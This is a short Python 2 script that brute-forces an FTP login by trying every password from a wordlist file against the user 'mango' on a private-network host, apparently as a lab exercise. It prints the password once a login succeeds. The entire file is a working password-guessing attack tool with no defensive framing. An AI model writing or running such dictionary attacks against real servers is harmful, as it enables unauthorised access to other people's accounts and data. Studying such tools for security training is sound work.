import ftplib
#import pexpect

host = "192.168.40.138"
user = "mango"

def attempt_ftp(passwd):
   ftp = ftplib.FTP(host)
   try:
      ftp.login(user,passwd)  
      ftp.quit()
      return True
   except :
      pass
   ftp.quit()
   return False
   
	
def main():
   words = open("wordlist.txt","r")
   for line in words.readlines():
      pwd = line.strip()
      print "Attempting --> ",pwd
      if(attempt_ftp(pwd)):
         print "The password is --> ",pwd
         break
   words.close()		 
   
if __name__ == '__main__':
   main()
